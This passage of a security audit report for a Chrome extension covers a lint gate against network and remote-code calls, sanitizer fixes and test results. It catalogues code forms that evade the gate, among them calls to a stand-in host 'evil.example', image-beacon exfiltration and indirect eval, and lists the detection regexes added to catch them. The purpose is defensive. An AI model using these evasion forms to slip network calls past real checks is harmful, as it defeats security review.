|---|---|---|---|
| 1 | `globalThis.fetch('https://…')` | CAUGHT (`/\bfetch\s*\(/`) | — |
| 2 | `new WebSocket(…)` / `importScripts(…)` / `new XMLHttpRequest()` | CAUGHT | — |
| 3 | approved alias called with a remote URL / with no argument | CAUGHT (alias-arg rule) | — |
| 4 | `const rf = globalThis.fetch; rf('https://evil.example/x')` | **MISSED** | **(iii) real gap** — a plain fetch acquired without `.bind(`, i.e. the very class the new rule targets, one token from the approved spelling |
| 5 | `window['fetch']('https://…')` | **MISSED** | **(iii) real gap** — a plain fetch call; the bracket form puts a quote between `fetch` and `(`, defeating both regexes |
| 6 | `const {fetch: f} = window; f('https://…')` | **MISSED** | **(iii) real gap** — a natural alias spelling the rule does not model |
| 7 | `navigator.sendBeacon('https://…', …)` | **MISSED** | **(iii) real gap** — an unmodelled network primitive (CSP does not block it) |
| 8 | `new EventSource('https://…')` | **MISSED** | **(iii) real gap** — unmodelled network primitive |
| 9 | `new Image().src = 'https://…/?d=' + …` | **MISSED** | **(iii) real gap** — an unmodelled exfil channel |
| 10 | `import('https://evil.example/x.js')` | **MISSED** | **(iii) real gap** — remote module load |
| 11 | `createElement('script').src='https://…'` (in a `.js`) | **MISSED** | **(iii) real gap** — the remote-`<script src>` rule only scans `.html`; second layer = the CSP `script-src 'self'` |
| 12 | `document.body.innerHTML='<script src="https://…">'` (in a `.js`) | **MISSED** | **(iii) real gap** — same, obfuscated |
| 13 | `(0,eval)('fetch')('https://…')` | **MISSED** | **(iii) real gap** — indirect eval also evades the pre-existing `/\beval\s*\(/` rule |
| 14 | `Reflect.get(globalThis,'fetch')(…)` | **MISSED** | (ii) residual/exotic — no token at all; deliberately evasive |
| 15 | `const n='fet'+'ch'; globalThis[n](…)` | **MISSED** | (ii) residual/exotic — computed member |
| 16 | `s.src='data:text/javascript,…'` | **MISSED** | (ii) residual — inline-code execution, no network; CSP-blocked on extension pages |

**Reachability today (verified, not assumed):** a repo-wide grep of `extension/**` for every token
in the MISSED rows (`sendBeacon`, `EventSource`, `new Image`, `createElement('script')`,
`Reflect.get`, `import(`, `{fetch:` / `{ fetch:`, `innerHTML = '<scr`, `window[`) returns **zero
hits** — so no missed form is reachable in the shipped zero-dep package today. The (iii) rows are
nevertheless **real gaps in the gate's own stated invariant** ("no remote code / network
primitives anywhere in `extension/`"): they are the plain, non-adversarial ways a future edit
could reintroduce a network call, which is precisely the threat model F-V19-2 was raised under.
**(ii) rows are residual gate limitations, not reachable defects.**
**The gate was NOT weakened** — the shipped package is unchanged and still exit 0.

### 13.5 MIRROR GUARDS — falsified (one strong, one weak)

Both guards live in `test/import-security.mjs:402-405`. Each mutation was applied to a **copy**
and the **real** guard was run.

- **`stats.js MISSION_STEPS` ⇄ `content.js MISSION_CORPUS` — STRONG.** F1: adding a 5th mission
  to `content.js` (`new-mission`, 2 steps) → guard **FAIL** with a readable diff
  (`corpus:{golive-ready:6,audit-only:4,fix-findings:4,release-prep:4,new-mission:2}` vs
  `stats:{…4 keys}`), exit 2. F2: dropping one `audit-only` step (4→3) → guard **FAIL**
  (`audit-only:3` vs `4`), exit 2. An engine-side mission/step drift breaks the guard **loudly**.
- **`stats.js LOCALE_IDS` ⇄ "the shipped locale set" — WEAK → NEW FINDING F-V19-6 (LOW).** The
  assertion compares `LOCALE_IDS` to a **hardcoded literal** `['en','vi','zh_CN','ja','ko','es']`,
  not to the shipped `_locales` directories or to `popup.js:11 LOCALE_IDS`. F3: shipping a 7th
  locale (`_locales/xx` copied from `en` + `'xx'` added to `popup.js LOCALE_IDS`, `stats.js`
  untouched) → i18n parity lint **exit 0**, mirror guard **exit 0 (PASS)** — while
  `sanitizeBackup({userLocale:'xx'})` → **`null`** (dropped), so a legitimate backup of the new
  locale's choice is silently lost and nothing goes RED. F4: the reverse drift (`'xx'` added to
  `stats.js LOCALE_IDS` only) → guard **FAIL**, exit 2. The guard therefore pins only one
  direction, and the sanitizer/engine drift it exists to catch can still happen in the other.
  **Fix direction:** assert `stats.js LOCALE_IDS` equals `popup.js`'s `LOCALE_IDS` and/or the
  shipped `_locales` directory set, rather than a literal.
- **Status: FIXED (S12b remediation round 2, §14).** The assertion is now bound to the shipped set
  in BOTH directions: `stats.js LOCALE_IDS` must equal (a) the `extension/_locales` directory set
  and (b) `popup.js`'s own `LOCALE_IDS` (same order), and every shipped locale must be ACCEPTED by
  `sanitizeBackup`. F3 (ship a 7th locale, `stats.js` untouched) → guard **FAIL, exit 2** (3
  assertions RED; the old literal guard on the same mutation is still GREEN while
  `sanitizeBackup({userLocale:'xx'})` → `null`). F4 (`stats.js`-only drift) → guard **FAIL, exit 2**.

### 13.6 GATES RE-RUN BY THIS LANE AT `10e0e07` (foreground, unpiped)

```
node scripts/lint.mjs                            exit 0  "lint OK — 24 checks across 18 files (syntax, JSON, i18n parity, no remote code, minimal permissions)"
node scripts/lint.mjs --self-test                exit 0  "all 3 cases PASS" (shipped clean / raw fetch flagged / readAsset(remote) flagged)
node test/import-security.mjs                    exit 0  total:50, failed:0
node test/e2e.mjs                                exit 0  ok:true; forbiddenHit:[]; denyCount:0; connectorCheck.ok:true (blockedConnector:2); encCheck.ok:true; statsPage.ok:true; locksProbe:true; n7count:1; n11count:1; orderOk:true; dedupSepOk:true
node test/followup-e2e.mjs                       exit 0  ok:true (119 named checks; the 2 nested ok:false are the EXPECTED engine refusals 'composer-not-empty' and 'paused', each inside a PASSING check)
node test/lang-switch-e2e.mjs                    exit 0  passed:36, failed:0, failedChecks:[]
node test/background-unit.mjs                    exit 0  total:29, failed:0
node test/mission-e2e.mjs                        exit 0  ok:true; 39 named checks; verifyTimeouts:[]; preflight corpus 4 ids / 18 steps / flagged:[] / controlPositive:2 / controlNegative:0
node scripts/bench/experience.mjs --only=assert  exit 0  pass:22, fail:0
```

**Environment:** Windows 11, git-bash/MSYS, Node **v26.7.0**, installed Chrome (CDP
`Extensions.loadUnpacked`, scratch profile — the user profile was never touched). Zero-dependency
repo; no bootstrap needed. All Chrome suites ran **foreground/unpiped** and returned real JSON.
(One earlier attempt to batch three suites with a 900 s timeout was auto-promoted to a background
process and the suites then died with no output — the non-TTY caveat is real for background/piped
runs; re-run foreground, they pass.)

### 13.7 RESIDUAL GATE LIMITATIONS (explicit)

1. **`scripts/lint.mjs` is a text-token lint, not a sandbox.** It enforces "zero network / no
   remote code" only for the token set it models (`fetch(`, `.fetch`, `eval(`, `new Function(`,
   `XMLHttpRequest`, `new WebSocket(`, `importScripts(`, remote `<script src>` in `.html`, plus
   the new bound-alias rule). The 13 missed forms in §13.4 stay green; the CSP
   (`script-src 'self'; object-src 'self';`) is a real second layer only for extension-page
   *script* injection, not for `sendBeacon`/`EventSource`/`Image`/`import()`.
2. **The new alias rule keys on the exact spelling `<g>.fetch.bind(<g>)`.** Any other acquisition
   (`= globalThis.fetch`, destructuring, bracket access, `Reflect.get`) is untracked, so the
   "every fetch-family call must pass `chrome.runtime.getURL(...)`" assertion only holds for that
   one spelling.
3. **The `LOCALE_IDS` mirror guard pins a literal, not the shipped set** (§13.5 / F-V19-6).
4. **Unchanged and carried:** F-V19-3 (fast-path settle window, `NOT_VERIFIED` beyond the
   fixture), F-V19-4 (per-instance/per-frame caps, `NOT_VERIFIED` multi-frame), V4-2 merge
   semantics + import outside the page Web Lock, SA-1 R-1 (a self-consistent crafted file still
   rotates the key), Chain D/E/F boundaries, and the settings-sync account boundary (§11).
5. **Not re-attacked by this lane (out of the S13 charter):** the Chains A–I runtime rails beyond
   re-running their suites, the artifact byte-verify/zip, and the paid path (§7 stays N/A).

### 13.8 S13 VERDICT (this lane, bound to `10e0e07`)

| Finding | S12 claim | **S13 re-bind** | Own evidence |
|---|---|---|---|
| **F-V19-1** (MEDIUM) | FIXED | **PARTIALLY_FIXED** | whitelist lag closed + v1.9-only end-to-end import (own probe); container emission clears restrictions 13/16 (pre-fix 0/16) → **F-V19-5** |
| **F-V19-2** (LOW) | FIXED | **PARTIALLY_FIXED** | reported alias blind spot closed (self-test + own catalogue); 13/19 attack forms missed with the gate green, none present in the package |
| **F-V19-5** (NEW, MEDIUM) | — | **OPEN** → **FIXED (S12b, §14)** | §13.3 table; regression vs the pre-fix blob |
| **F-V19-6** (NEW, LOW) | — | **OPEN** → **FIXED (S12b, §14)** | §13.5 F3/F4 |
| F-V19-3 (INFO) | `NOT_VERIFIED` | `NOT_VERIFIED` (unchanged) | not re-probed |
| F-V19-4 (INFO) | `NOT_VERIFIED` | `NOT_VERIFIED` (unchanged) | not re-probed |

**No old PASS is re-cited as fresh evidence anywhere in this section.** Every gate line in §13.6
and every probe result above was produced by this lane at `10e0e07`; the S12 claims in §9/§10.1
are preserved verbatim and are superseded only where §13 states a re-bound verdict.

---

## 14. S12b — REMEDIATION ROUND 2 (F-V19-5 + F-V19-6 FIXED, gate hardened)

**Lane discipline:** this lane fixes the ROOT CAUSE of the S13 regression and proves the PROPERTY
that matters (the engine's effective post-import state can never become LOOSER than the stored one),
not the shape of the sanitizer's output — the shape-only view was the S12 test's blind spot.
Write set: `extension/stats.js`, `scripts/lint.mjs`, `test/import-security.mjs`, this document.
No `extension/content.js` / `background.js` / `popup.*` / `_locales/**` / `store/**` change; no git
operation. Scratch probes live in `…/Local/Temp/maa_s12b/`.

### 14.0 REVISION BINDING

| Item | Value |
|---|---|
| Repo | `C:/00. AI Project/PRJ_AutoAllowMUSE` (public), branch `main` |
| Base revision | `50436cb` — "fix(security): F-V19-1 import sanitizer whitelist + F-V19-2 zero-network gate (remediation at the root cause)" (= the amended `10e0e07`, identical tree; §13.0) |
| HEAD at this lane | `a89ac0c` (the S13 §13 doc commit) — this lane adds the F-V19-5/F-V19-6 fixes on top |
| sha256 `extension/stats.js` | `26c5c52e56827213e394066df7033a6020a2b10d368f70219f78c9185985bbcf` (was `ed84c251…` at `10e0e07`/`50436cb`) |
| sha256 `scripts/lint.mjs` | `776b8dc28253395c729199ab3f5fed80800b64a0d67469c21e0db4e4fafefa0b` (was `924815d9…`) |
| sha256 `test/import-security.mjs` | `c9c1cd20b07f08ff6425859b5d991a4fc4116a9ad39a3a46749db6c40a0399a3` (was `1b88aa2f…`) |
| sha256 `extension/content.js` | `92fc55638020dfa9d3a702a4eec6b18c12a41527353a10462314c0fb32ab2eb1` (UNCHANGED — the engine is the oracle, never edited) |

`FIXED_ON` = the S12b revision above. `VERIFIED_ON` stays for a further independent re-attack lane —
nothing here is a re-attack.

### 14.1 F-V19-5 — **FIXED** (MEDIUM, fail-open on a stored restriction)

**Root cause (both halves were needed — either alone is insufficient, §14.2 falsifications):**

1. **Container emission** (`extension/stats.js` `sanitizeBackup`). `out.rules` / `out.followupSmart`
   / `out.followupSchedule` were emitted **unconditionally** whenever `plainObj()` returned an
   object, so a container whose sub-values were ALL rejected was written as `{}` (or a partial
   object) into storage, and the engine's presence-aware reader (`content.js:399`
   `if ('allowTopics' in rules)`) turned each missing sub-key into a **reset to the shipped default**
   on the next content-script boot. Fix: a container is emitted **only when it carries ≥ 1 ACCEPTED
   sub-key**; an all-rejected/empty container is DROPPED entirely (never `{}`), so "absent" leaves the
   stored container untouched. `seen` is incremented only for an emitted container, so a file of
   junk-only containers is refused outright (`seen === 0` → `null` → "Not a backup").
2. **Sub-key merge** (`extension/stats.js` `mergeStoredContainers`, called in the import handler
   before `chrome.storage.local.set(clean)`). The three containers are **composite**: the storage
   write replaces the WHOLE container, so a file that validly provides only SOME sub-keys would still
   reset the rest to the engine default (e.g. `{rules:{allowTopics:['repo-x']}}` — no `blockKeywords`
   — made the engine re-apply the seed blocklist, silently losing a custom one). Fix: merge at
   **sub-key granularity** with what is stored — the file's ACCEPTED sub-keys win, a sub-key the file
   did not validly provide keeps its STORED value. Only the engine's own sub-key names are copied
   (`CONTAINER_SUBKEYS`, mirroring `content.js:397-419`), so no crafted `__proto__`/extra key rides
   along. An honest full backup still replaces every sub-key (popup.js always writes all of them), so
   restore semantics are unchanged for honest files.

**The `blockKeywords: []` (and `allowTopics: []`) facet — decided explicitly: an empty array is
NEVER imported.** Justification from the engine's reader semantics: `content.js:399-403` reads an
explicit `[]` as "no topic restriction" / "nothing blocked" — i.e. the **loosest** possible value
(`v18.blockKeywords = (kws || [])` with `kws = []`) — and the sanitizer's `strList()` cannot
distinguish a user's deliberate `[]` from an all-junk array (`[null,5,{}]` reduces to `[]`), so
keeping `[]` would be a **junk-reachable way to CLEAR a stored restriction**. An empty list is
therefore dropped, the stored restriction survives (fail-closed), and the file is not counted toward
`seen`. Consequence, stated honestly: the "empty blocklist" state stays reachable from the **popup
UI** (as S13 noted), not from an import — a deliberate asymmetry: **the import path can only tighten
or preserve, never clear.**

### 14.2 F-V19-5 — PROOF (the property, on the ENGINE's effective values)

`test/import-security.mjs` now slices the **real engine readers** out of `extension/content.js`
(`asObj`, `sanitizeList`, `hourOf`, `applyV18Settings`, the `v18` defaults, `MISSION_CORPUS`,
`sanitizeMission`, `applyMissionSettings` — extracted by brace/quote-aware slicing, so an engine
drift changes the assertion inputs) and boots them on the **merged** stored state exactly as
`content.js:1569-1570` does. The matrix drives the **real import handler** and then asserts the
**engine's effective post-boot values**.

- **Matrix (22 crafted files, 3 containers × every sub-key):** (a) valid → the value survives
  byte-for-byte; (b) invalid/mixed → the engine's effective value is **UNCHANGED from the stored
  state** for every sub-key the file did not validly provide; (c) junk-only container → **no
  container is emitted at all** (and, when the file has no other accepted key, it is refused); (d)
  the explicitly-empty-array case per the decision above. Plus an explicit `looseness(after, before,
  provided)` predicate over `allowTopics` / `blockKeywords` / `smart.*` / `schedule.*` / `pauseUntil`
  / `dryRun` / `mission`.
- **Result:** `node test/import-security.mjs` → **exit 0, total 142, failed 0**; the summary
  assertion reads **"0 of 22 crafted files clear a stored restriction (S13 measured 13/16 before this
  fix)"**. The 22 cases restate the S13 §13.3 rows (1, 3, 4, 5, 6, 7, 9, 10, 11) plus the mixed /
  partial-container cases the shape-only test missed. (The S13 lane's own scratch probes are not in
  the repo — its rows are restated here rather than re-run.)
- **Reverse-mutation falsifications** (mutated `extension/stats.js` copies, real harness, real
  handler + real engine):
  - revert the **container-emission** fix (back to the S12 unconditional form) → **34 FAILs,
    exit 2** — incl. `{rules:{allowTopics:[['repo-x'],5,null,{},'  ']}}` → `{rules:{allowTopics:[]}}`
    → engine `allowTopics` `[]` (whitelist CLEARED).
  - revert the **sub-key merge** only (keep the emission fix) → **11 FAILs, exit 2** — incl.
    `{rules:{allowTopics:['repo-x']}}` → engine `blockKeywords` = the seed list (custom `custom-kw`
    LOST) and the smart config reset to the shipped prompts.
  - revert **both** (the full S12 shape) → **64 FAILs, exit 2**, and **19 of the 22** crafted files
    clear a stored restriction (shipped: **0 of 22**).

### 14.3 F-V19-6 — **FIXED** (LOW, mirror guard pinned a literal)

The `LOCALE_IDS` assertion in `test/import-security.mjs` no longer compares against a hardcoded
literal. It is bound to the **shipped set in both directions**: `stats.js LOCALE_IDS` must equal
(a) the `extension/_locales` directory set (sorted) and (b) `popup.js`'s own `LOCALE_IDS` (same
order), and **every shipped locale must be ACCEPTED by `sanitizeBackup`** (the silent-loss direction).
- **F3** (ship a 7th locale: `_locales/xx` + `'xx'` in `popup.js`, `stats.js` untouched) → guard
  **FAIL, exit 2** (3 assertions RED: `_locales` set, `popup.js` set, and `dropped:['xx']`). The
  OLD literal guard on the SAME mutation is still **GREEN** while `sanitizeBackup({userLocale:'xx'})`
  → `null` — i.e. the drift was silent before and is caught now.
- **F4** (`'xx'` added to `stats.js LOCALE_IDS` only) → guard **FAIL, exit 2** (5 assertions RED,
  incl. the sanitizer now accepting an unshipped id).

### 14.4 GATE HARDENING (F-V19-2 residual, S13 §13.4)

`scripts/lint.mjs` gains a shared `securityFindings()` scanner (used by BOTH the main scan and
`--self-test`, so the self-test proves the rule set the gate actually runs) with these new
primitives, keyed to the PRIMITIVE rather than to a URL:

| form | rule |
|---|---|
| `navigator.sendBeacon(` | `\bsendBeacon\s*\(` |
| `new EventSource(` | `new\s+EventSource\s*\(` |
| `new Image(` + `.src` | `new\s+Image\s*\(` and `\.\s*src\s*=` |
| `createElement('script')` | `createElement\s*\(\s*['"]script['"]\s*\)` + `innerHTML…<script` |
| dynamic `import(` | `import\(` / `import (` + a string literal |
| destructured/aliased fetch | `\{\s*fetch\b`, `\[\s*['"]fetch['"]\s*\]`, `Reflect\.get\(…['"]fetch['"]` |
| indirect `(0,eval)(` | `(?:^\|[^\w$.])eval\b(?!\s*\()` |

The pre-existing checks and the approved alias rule are unchanged; the `.fetch` anchor was widened
to the member itself (`\.\s*fetch\b` on the masked source) so `const rf = globalThis.fetch;` is now
caught while `<g>.fetch.bind(<g>)` stays clean.

**Proof / no false positives:** `node scripts/lint.mjs` → **exit 0** ("lint OK — 24 checks across 18
files"); `node scripts/lint.mjs --self-test` → **all 15 cases PASS**, including a case that scans
**ALL shipped `extension/**` sources** and expects **zero** findings. The shipped package contains
none of the new forms (the only `.src` is a CSS selector, the only `innerHTML` values carry no
`<script`, and the only `import` tokens are the words "import (…" inside comments — which is why the
`import` rule requires `import(` or `import ('…')`, not `import (` + prose).
**Falsification:** a real copy of the package with one vector file added, per form → the real gate
returns **exit 1** naming the vector file for **all 11** new vectors; baseline and restored copy →
**exit 0**.

### 14.5 GATES RE-RUN BY THIS LANE (foreground, unpiped, on the fixed tree)

```
node scripts/lint.mjs                            exit 0  "lint OK — 24 checks across 18 files (syntax, JSON, i18n parity, no remote code, minimal permissions)"
node scripts/lint.mjs --self-test                exit 0  "all 15 cases PASS"
node test/import-security.mjs                    exit 0  total:142, failed:0  (F-V19-5 PROPERTY: 0 of 22 clear; F-V19-6 mirror 4 checks)
node test/e2e.mjs                                exit 0  ok:true; forbiddenHit:[]; denyCount:0; n7count:1; n11count:1; orderOk:true; dedupSepOk:true; encCheck.ok:true; connectorCheck.ok:true; statsPage.ok:true; locksProbe:true
node test/followup-e2e.mjs                       exit 0  ok:true (the nested ok:false are the EXPECTED engine refusals)
node test/lang-switch-e2e.mjs                    exit 0  passed:36, failed:0, failedChecks:[]
node test/background-unit.mjs                    exit 0  total:29, failed:0
node test/mission-e2e.mjs                        exit 0  ok:true; preflight corpus 4 ids / 18 steps / flagged:[] / controlPositive:2 / controlNegative:0; verifyTimeouts:[]
node scripts/bench/experience.mjs --only=assert   exit 0  pass:22, fail:0
```

**Environment:** Windows 11, git-bash/MSYS, Node **v26.7.0**, installed Chrome via CDP
(`Extensions.loadUnpacked`, scratch profile — the user profile was never touched). Zero-dependency
repo; no bootstrap needed. All Chrome suites ran **foreground/unpiped** and returned real JSON.

### 14.6 RESIDUAL AFTER THIS ROUND (explicit)

1. **The gate is still a text-token lint, not a sandbox.** The realistic forms above are now
   caught; the deliberately evasive rows of §13.4 stay green — a **computed** member
   (`const n='fet'+'ch'; globalThis[n](…)`), `s.src='data:text/javascript,…'` (inline code, no
   network; CSP-blocked on extension pages), and any fetch acquired by an unmodelled expression.
   The CSP (`script-src 'self'`) remains the second layer for extension-page script injection only.
2. **The import path is now strictly tightening-or-preserving for the three containers.** The cost,
   stated honestly: a restore from a file whose blocklist was emptied leaves the stored blocklist in
   place, and an empty `allowTopics` cannot be imported. That state stays reachable from the popup UI.
3. **Unchanged and carried:** F-V19-3 / F-V19-4 (INFO, `NOT_VERIFIED` beyond the fixture), the V4-2
   merge semantics + import-outside-the-Web-Lock note, SA-1 R-1, the Chain D/E/F boundaries, and the
   settings-sync account boundary (§11).
4. **`VERIFIED_ON` is not claimed here.** This is a remediation lane; an independent re-attack at the
   S12b revision is still required before any GO verdict is re-issued.

